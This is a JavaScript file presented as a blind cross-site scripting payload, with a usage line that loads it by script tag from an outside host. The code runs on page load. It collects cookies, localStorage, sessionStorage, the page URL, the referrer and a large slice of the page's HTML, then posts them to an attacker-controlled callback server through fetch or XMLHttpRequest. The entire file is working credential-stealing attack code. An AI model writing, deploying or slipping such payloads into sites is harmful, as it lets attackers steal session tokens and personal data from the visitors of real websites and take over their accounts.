// Blind XSS Payload
// Usage: <script src="https://dmtanalytics.net/t"></script>

(function () {
  'use strict';

  var SERVER = '{{SERVER_URL}}';

  function safe(fn) {
    try { return fn(); } catch (e) { return null; }
  }

  function collectLocalStorage() {
    var out = {};
    safe(function () {
      for (var i = 0; i < localStorage.length; i++) {
        var k = localStorage.key(i);
        out[k] = localStorage.getItem(k);
      }
    });
    return out;
  }

  function collectSessionStorage() {
    var out = {};
    safe(function () {
      for (var i = 0; i < sessionStorage.length; i++) {
        var k = sessionStorage.key(i);
        out[k] = sessionStorage.getItem(k);
      }
    });
    return out;
  }

  function collectCookies() {
    return safe(function () {
      var out = {};
      if (!document.cookie) return out;
      document.cookie.split(';').forEach(function (pair) {
        var parts = pair.trim().split('=');
        var key = decodeURIComponent(parts[0]);
        var val = decodeURIComponent(parts.slice(1).join('='));
        out[key] = val;
      });
      return out;
    }) || {};
  }

  function collectDOM() {
    return safe(function () {
      return document.documentElement.outerHTML.substring(0, 30000);
    });
  }

  function send(data) {
    var payload = JSON.stringify(data);

    // Try fetch first
    if (typeof fetch !== 'undefined') {
      safe(function () {
        fetch(SERVER + '/callback', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: payload,
          keepalive: true,
          mode: 'no-cors',
          credentials: 'omit'
        });
      });
      return;
    }

    // Fallback: XMLHttpRequest
    safe(function () {
      var xhr = new XMLHttpRequest();
      xhr.open('POST', SERVER + '/callback', true);
      xhr.setRequestHeader('Content-Type', 'application/json');
      xhr.send(payload);
    });
  }

  function run() {
    var data = {
      url: safe(function () { return window.location.href || document.URL; }),
      referer: safe(function () { return document.referrer; }),
      title: safe(function () { return document.title; }),
      cookies: collectCookies(),
      localStorage: collectLocalStorage(),
      sessionStorage: collectSessionStorage(),
      dom: collectDOM(),
      origin: safe(function () { return window.origin; }),
      timestamp: new Date().toISOString(),
    };
    send(data);
  }

  // Wait for DOM if still loading, otherwise run immediately
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', run);
  } else {
    run();
  }

})();
